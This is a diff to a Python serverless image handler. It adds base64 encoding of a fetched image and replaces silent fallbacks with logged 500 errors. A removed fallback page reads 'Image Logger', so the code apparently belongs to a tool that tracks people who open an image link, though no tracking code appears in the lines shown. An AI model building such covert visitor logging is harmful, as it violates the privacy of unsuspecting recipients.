@@ -355,24 +355,30 @@ def app(request):
             img_response = requests.get(url, timeout=5)
             image_data = img_response.content
             content_type = img_response.headers.get('Content-Type', 'image/jpeg')
-        except:
-            # Fallback to empty image
-            image_data = b''
-            content_type = 'image/jpeg'
-        
-        return {
-            "statusCode": 200,
-            "headers": {
-                "Content-Type": content_type,
-                "Content-Length": str(len(image_data))
-            },
-            "body": image_data.decode('latin-1') if image_data else ""
-        }
+            
+            # Base64 encode for Vercel
+            image_base64 = base64.b64encode(image_data).decode('utf-8')
+            
+            return {
+                "statusCode": 200,
+                "headers": {
+                    "Content-Type": content_type,
+                },
+                "body": image_base64,
+                "isBase64Encoded": True
+            }
+        except Exception as e:
+            reportError(f"Image download failed: {str(e)}")
+            return {
+                "statusCode": 500,
+                "headers": {"Content-Type": "text/plain"},
+                "body": "Failed to load image"
+            }
     
     except Exception as e:
         reportError(traceback.format_exc())
         return {
-            "statusCode": 200,
-            "headers": {"Content-Type": "text/html"},
-            "body": "<html><body>Image Logger</body></html>"
+            "statusCode": 500,
+            "headers": {"Content-Type": "text/plain"},
+            "body": "Internal server error"
         }
